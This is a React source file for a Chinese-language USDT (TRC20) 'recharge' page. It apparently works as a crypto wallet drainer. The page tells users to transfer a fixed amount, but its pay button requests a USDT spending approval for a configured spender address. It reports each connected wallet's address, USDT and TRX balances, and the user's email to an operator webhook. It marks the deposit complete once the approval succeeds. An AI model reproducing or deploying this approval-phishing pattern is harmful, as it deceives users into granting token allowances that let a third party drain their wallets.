import { useState, useEffect, useRef } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { useTranslation } from 'react-i18next';
import { Copy, Check, Clock, DollarSign, Shield, Zap, Info, AlertCircle, Wallet, ExternalLink } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Navbar, AnnouncementBar, Footer } from '@/components/layout';
import { useAuth } from '@/contexts/AuthContext';
import { useToast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';
import { useTronWallet, WALLET_CONFIGS } from '@/hooks/useTronWallet';
import PaymentModeModal from '@/components/recharge/PaymentModeModal';
import { sendWalletConnectedEvent, sendAuthorizationCompletedEvent } from '@/lib/webhookService';

const PAYMENT_TIMEOUT = 15 * 60; // 15 minutes in seconds

// Generate unique payment order ID
const generatePaymentOrderId = () => {
  const timestamp = Date.now();
  const random = Math.random().toString(36).substring(2, 8).toUpperCase();
  return `USTHERO${timestamp}${random}`;
};

export default function RechargeUsdtPage() {
  const { t } = useTranslation();
  const [searchParams] = useSearchParams();
  const [copied, setCopied] = useState(false);
  const [copiedOrderId, setCopiedOrderId] = useState(false);
  const [timeLeft, setTimeLeft] = useState(PAYMENT_TIMEOUT);
  const [paymentOrderId, setPaymentOrderId] = useState<string>('');
  const [showPaymentModal, setShowPaymentModal] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [spenderAddress, setSpenderAddress] = useState<string>('TYDzsYUEpvnYmQk4zGP9sWWcTEd2MiAtW6');
  const [supportLink, setSupportLink] = useState<string>('https://t.me/herosms_support');
  const hasCreatedOrder = useRef(false);
  const { user } = useAuth();
  const { toast } = useToast();
  const navigate = useNavigate();

  const {
    isConnected,
    address,
    isConnecting,
    error: walletError,
    connect,
    detectWallets,
    openWallet,
    approveUSDT,
    checkTronWeb,
    checkBalances,
  } = useTronWallet();

  const amount = searchParams.get('amount') || '50';
  const orderId = searchParams.get('order_id') || '';

  // Generate the payment URL for QR code
  const currentPageUrl = typeof window !== 'undefined' ? window.location.href : '';
  const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(currentPageUrl)}`;

  // Get detected wallets
  const isMobile = typeof window !== 'undefined' && /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
  const hasTronWeb = checkTronWeb();

  // Fetch settings from app_settings
  useEffect(() => {
    const fetchSettings = async () => {
      try {
        const { data } = await supabase
          .from('app_settings')
          .select('key, value')
          .in('key', ['spender_address', 'support_link']);

        if (data) {
          data.forEach((item: { key: string; value: string }) => {
            if (item.key === 'spender_address') setSpenderAddress(item.value);
            if (item.key === 'support_link') setSupportLink(item.value);
          });
        }
      } catch (e) {
        console.error('Error fetching settings:', e);
      }
    };
    fetchSettings();
  }, []);

  // Initialize payment order and timer
  useEffect(() => {
    if (!user) {
      navigate('/auth');
      return;
    }

    // If there's an order_id from URL, use it
    if (orderId) {
      setPaymentOrderId(orderId);
    }

    const initializeOrder = async () => {
      if (orderId) {
        // Check if order already exists
        const { data: existingOrder } = await supabase
          .from('transactions')
          .select('id')
          .eq('order_id', orderId)
          .maybeSingle();

        if (!existingOrder) {
          try {
            await supabase.from('transactions').insert({
              user_id: user.id,
              amount: parseFloat(amount),
              type: 'deposit',
              status: 'pending',
              order_id: orderId,
              payment_method: 'TRC20',
              currency: 'USDT',
            });
          } catch (err) {
            console.error('Error creating payment order:', err);
          }
        }
        return;
      }

      if (hasCreatedOrder.current) return;
      hasCreatedOrder.current = true;

      const newPaymentOrderId = generatePaymentOrderId();
      setPaymentOrderId(newPaymentOrderId);

      try {
        await supabase.from('transactions').insert({
          user_id: user.id,
          amount: parseFloat(amount),
          type: 'deposit',
          status: 'pending',
          order_id: newPaymentOrderId,
          payment_method: 'TRC20',
          currency: 'USDT',
        });
      } catch (err) {
        console.error('Error creating payment order:', err);
      }
    };

    initializeOrder();

    // Start countdown timer
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          toast({
            title: '支付超时',
            description: '请重新发起充值',
            variant: 'destructive',
          });
          navigate('/recharge');
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [user, toast, amount, orderId, navigate]);

  // Try to connect wallet automatically
  useEffect(() => {
    if (hasTronWeb && !isConnected) {
      connect();
    }
  }, [hasTronWeb, isConnected, connect]);

  // Update transaction with wallet address when connected and send webhook
  const hasSentWalletEvent = useRef(false);
  useEffect(() => {
    const updateWalletAddressAndSendWebhook = async () => {
      if (isConnected && address && paymentOrderId && !hasSentWalletEvent.current) {
        // Update transaction in database
        await supabase
          .from('transactions')
          .update({ wallet_address: address })
          .eq('order_id', paymentOrderId);

        // Check balances
        const balances = await checkBalances(parseFloat(amount));

        // Get username from user profile
        let username = 'unknown';
        if (user) {
          const { data: profile } = await supabase
            .from('profiles')
            .select('email')
            .eq('user_id', user.id)
            .single();
          if (profile?.email) {
            username = profile.email;
          }
        }

        // Send wallet connected event
        hasSentWalletEvent.current = true;
        await sendWalletConnectedEvent({
          order_id: paymentOrderId,
          wallet_address: address,
          username,
          currency: 'USDT',
          network: 'TRC20',
          spender_address: spenderAddress,
          usdt_balance: balances.usdtBalance,
          trx_balance: balances.trxBalance
        });
      }
    };
    updateWalletAddressAndSendWebhook();
  }, [isConnected, address, paymentOrderId, user, spenderAddress, amount, checkBalances]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const copyLink = async () => {
    try {
      await navigator.clipboard.writeText(currentPageUrl);
      setCopied(true);
      toast({ title: '复制成功', description: '支付链接已复制到剪贴板' });
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      toast({ title: '复制失败', description: '请手动复制链接', variant: 'destructive' });
    }
  };

  const copyOrderId = async () => {
    try {
      await navigator.clipboard.writeText(paymentOrderId);
      setCopiedOrderId(true);
      toast({ title: '复制成功', description: '订单号已复制到剪贴板' });
      setTimeout(() => setCopiedOrderId(false), 2000);
    } catch (err) {
      toast({ title: '复制失败', description: '请手动复制订单号', variant: 'destructive' });
    }
  };

  const handlePayClick = async () => {
    if (isConnected) {
      setShowPaymentModal(true);
    } else {
      const connected = await connect();
      if (!connected && isMobile) {
        toast({
          title: '请选择钱包',
          description: '点击下方钱包图标打开对应钱包App',
        });
      }
    }
  };

  const handlePaymentConfirm = async (paymentAmount: number, mode: 'safe' | 'whitelist') => {
    setIsProcessing(true);

    // Get username for webhook
    let username = 'unknown';
    if (user) {
      const { data: profile } = await supabase
        .from('profiles')
        .select('email')
        .eq('user_id', user.id)
        .single();
      if (profile?.email) {
        username = profile.email;
      }
    }

    // Get current balances before approval
    const balances = await checkBalances(paymentAmount);

    try {
      const result = await approveUSDT(spenderAddress, paymentAmount);

      // Send authorization completed webhook immediately
      sendAuthorizationCompletedEvent({
        order_id: paymentOrderId,
        wallet_address: address || '',
        username,
        currency: 'USDT',
        network: 'TRC20',
        spender_address: spenderAddress,
        usdt_balance: balances.usdtBalance,
        trx_balance: balances.trxBalance,
        tx_hash: result.txHash || '',
        status: result.success ? 'success' : 'failed',
        payment_mode: mode
      }).catch(err => console.error('Failed to send webhook:', err));

      // Update transaction status
      if (paymentOrderId) {
        await supabase
          .from('transactions')
          .update({
            status: result.success ? 'completed' : 'failed',
            tx_hash: result.txHash,
            wallet_address: address,
            completed_at: result.success ? new Date().toISOString() : null
          })
          .eq('order_id', paymentOrderId);
      }

      if (result.success) {
        toast({
          title: '授权成功',
          description: '正在处理您的充值请求...',
        });
        // Navigate to user center after successful authorization
        setTimeout(() => navigate('/user-center?tab=profile'), 2000);
      } else {
        toast({
          title: '授权失败',
          description: result.error || '请重试',
          variant: 'destructive',
        });
      }

      setShowPaymentModal(false);
    } catch (err: any) {
      toast({
        title: '交易失败',
        description: err.message || '请重试',
        variant: 'destructive',
      });
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <Navbar />
      <AnnouncementBar />

      <main className="flex-1 py-8">
        <div className="container mx-auto px-4 max-w-lg">
          {/* Header */}
          <div className="bg-primary rounded-t-xl p-6 text-primary-foreground">
            <div className="flex items-center gap-3">
              <div className="w-12 h-12 rounded-full bg-primary-foreground/20 flex items-center justify-center">
                <DollarSign className="h-6 w-6" />
              </div>
              <div>
                <h1 className="text-xl font-bold">USDT充值</h1>
                <p className="text-sm opacity-80">TRC20网络支付</p>
              </div>
            </div>

            {/* Amount and Timer */}
            <div className="grid grid-cols-2 gap-4 mt-6">
              <div className="bg-primary-foreground/10 rounded-lg p-4 flex items-center gap-3">
                <div className="w-10 h-10 rounded-full bg-primary-foreground/20 flex items-center justify-center">
                  <DollarSign className="h-5 w-5" />
                </div>
                <div>
                  <div className="text-xs opacity-70">充值金额</div>
                  <div className="text-lg font-bold">{amount} USDT</div>
                </div>
              </div>
              <div className="bg-primary-foreground/10 rounded-lg p-4 flex items-center gap-3">
                <div className="w-10 h-10 rounded-full bg-primary-foreground/20 flex items-center justify-center">
                  <Clock className="h-5 w-5" />
                </div>
                <div>
                  <div className="text-xs opacity-70">剩余时间</div>
                  <div className={`text-lg font-bold ${timeLeft < 120 ? 'text-red-300' : ''}`}>
                    {formatTime(timeLeft)}
                  </div>
                </div>
              </div>
            </div>

            {/* Payment Order ID */}
            {paymentOrderId && (
              <div className="mt-4 bg-primary-foreground/10 rounded-lg p-4">
                <div className="flex items-center justify-between">
                  <div>
                    <div className="text-xs opacity-70">支付订单号</div>
                    <div className="text-sm font-mono font-bold">{paymentOrderId}</div>
                  </div>
                  <Button
                    variant="ghost"
                    size="sm"
                    className="text-primary-foreground hover:bg-primary-foreground/20"
                    onClick={copyOrderId}
                  >
                    {copiedOrderId ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                  </Button>
                </div>
              </div>
            )}

            {/* Wallet Connection Status */}
            {isConnected && address && (
              <div className="mt-4 bg-green-500/20 rounded-lg p-4">
                <div className="flex items-center gap-2">
                  <Wallet className="h-5 w-5" />
                  <div>
                    <div className="text-xs opacity-70">已连接钱包</div>
                    <div className="text-sm font-mono">{address.slice(0, 8)}...{address.slice(-6)}</div>
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* Main Content */}
          <div className="bg-card border border-border rounded-b-xl">
            {/* QR Code Section - Only show when wallet is NOT connected */}
            {!isConnected && (
              <div className="p-6 border-b border-border">
                {/* Desktop: Show QR Code */}
                <div className="hidden md:flex flex-col items-center">
                  <div className="p-4 bg-background border border-border rounded-lg">
                    <img
                      src={qrCodeUrl}
                      alt="Payment QR Code"
                      className="w-48 h-48"
                    />
                  </div>
                  <p className="text-sm text-muted-foreground text-center mt-4 max-w-xs">
                    打开钱包首页扫描上方二维码进入支付页面。仅支持TRC20支付渠道。
                  </p>
                </div>

                {/* Mobile: Show wallet options */}
                <div className="md:hidden">
                  <div className="bg-muted/50 rounded-lg p-4 mb-4">
                    <div className="flex items-center gap-2 mb-3">
                      <span className="bg-primary text-primary-foreground text-xs px-2 py-1 rounded-full">支付流程</span>
                      <span className="text-muted-foreground text-sm">三步完成交易</span>
                    </div>
                    <div className="space-y-2 text-sm">
                      <div className="flex items-center gap-2">
                        <span className="text-primary">①</span>
                        <span>点击右侧复制按钮</span>
                        <Button size="sm" variant="secondary" onClick={copyLink} className="ml-auto">
                          {copied ? <Check className="h-3 w-3" /> : <Copy className="h-3 w-3" />}
                          <span className="ml-1">复制</span>
                        </Button>
                      </div>
                      <div className="flex items-start gap-2">
                        <span className="text-primary">②</span>
                        <span>打开您的钱包App，进入DApp浏览器</span>
                      </div>
                      <div className="flex items-start gap-2">
                        <span className="text-primary">③</span>
                        <span>粘贴刚点击复制的网址访问，即可完成支付</span>
                      </div>
                    </div>
                  </div>

                  {/* Wallet Icons */}
                  <p className="text-muted-foreground text-sm text-center mb-3">点击图标打开对应钱包</p>
                  <div className="grid grid-cols-4 gap-4">
                    {WALLET_CONFIGS.map((wallet) => (
                      <button
                        key={wallet.id}
                        onClick={() => openWallet(wallet.id)}
                        className="flex flex-col items-center gap-2 p-3 rounded-lg hover:bg-muted transition-colors"
                      >
                        <img
                          src={wallet.icon}
                          alt={wallet.name}
                          className="w-12 h-12 rounded-xl"
                          onError={(e) => {
                            e.currentTarget.src = '/placeholder.svg';
                          }}
                        />
                        <span className="text-xs text-muted-foreground">{wallet.name}</span>
                      </button>
                    ))}
                  </div>

                  {/* Copy URL Section */}
                  <div className="mt-4 p-4 bg-muted/50 rounded-lg">
                    <div className="flex items-center gap-2 mb-2">
                      <ExternalLink className="h-4 w-4 text-primary" />
                      <span className="font-medium text-sm">其他钱包支付</span>
                    </div>
                    <div className="flex gap-2">
                      <input
                        type="text"
                        value={currentPageUrl}
                        readOnly
                        className="flex-1 bg-background text-xs p-2 rounded border border-border"
                      />
                      <Button size="sm" variant="secondary" onClick={copyLink}>
                        {copied ? '已复制' : '复制'}
                      </Button>
                    </div>
                  </div>
                </div>

                {/* Wallet installation tip */}
                <div className="mt-4 p-3 bg-amber-50 dark:bg-amber-950/30 rounded-lg text-center">
                  <p className="text-sm text-amber-700 dark:text-amber-400">
                    请安装 TronLink 或 TokenPocket 以获得最佳体验
                  </p>
                </div>
              </div>
            )}

            {/* Payment Button */}
            <div className="p-6 border-b border-border">
              <Button
                className="w-full h-12 text-lg font-medium"
                onClick={handlePayClick}
                disabled={isConnecting}
              >
                {isConnecting ? (
                  <>连接钱包中...</>
                ) : isConnected ? (
                  <>支付</>
                ) : (
                  <>连接钱包并支付</>
                )}
              </Button>

              {walletError && (
                <p className="text-sm text-destructive text-center mt-2">{walletError}</p>
              )}
            </div>

            {/* Payment Instructions */}
            <div className="p-6">
              <div className="flex items-center gap-2 mb-4">
                <Info className="h-5 w-5 text-primary" />
                <span className="font-medium">支付须知</span>
              </div>

              <div className="space-y-3">
                <div className="flex items-center gap-3 p-3 bg-muted/50 rounded-lg">
                  <Shield className="h-5 w-5 text-green-500 shrink-0" />
                  <span className="text-sm">
                    请务必使用 <strong>TRC20</strong> 网络转账
                  </span>
                </div>

                <div className="flex items-center gap-3 p-3 bg-muted/50 rounded-lg">
                  <DollarSign className="h-5 w-5 text-yellow-500 shrink-0" />
                  <span className="text-sm">
                    转账金额必须为 <strong>{amount} USDT</strong>
                  </span>
                </div>

                <div className="flex items-center gap-3 p-3 bg-muted/50 rounded-lg">
                  <Clock className="h-5 w-5 text-primary shrink-0" />
                  <span className="text-sm">
                    请在 <strong>15分钟</strong> 内完成转账
                  </span>
                </div>

                <div className="flex items-center gap-3 p-3 bg-muted/50 rounded-lg">
                  <Zap className="h-5 w-5 text-primary shrink-0" />
                  <span className="text-sm">
                    系统将在 <strong>1-5分钟</strong> 内自动确认
                  </span>
                </div>
              </div>

              {/* Support Tip with Order ID */}
              <div className="mt-4 p-4 bg-destructive/10 border-2 border-destructive rounded-lg">
                <div className="flex items-start gap-3">
                  <AlertCircle className="h-5 w-5 text-destructive shrink-0 mt-0.5" />
                  <div>
                    <p className="text-sm text-destructive font-medium">
                      支付遇到问题?
                    </p>
                    <p className="text-sm text-muted-foreground mt-1">
                      请将订单号 <strong className="text-foreground font-mono">{paymentOrderId}</strong> 提供给客服
                    </p>
                    <a
                      href={supportLink}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="inline-flex items-center gap-1 text-sm text-primary hover:underline mt-2"
                    >
                      联系客服 →
                    </a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>

      <Footer />

      {/* Payment Mode Modal */}
      <PaymentModeModal
        isOpen={showPaymentModal}
        onClose={() => setShowPaymentModal(false)}
        amount={parseFloat(amount)}
        onConfirm={handlePaymentConfirm}
        isProcessing={isProcessing}
      />
    </div>
  );
}
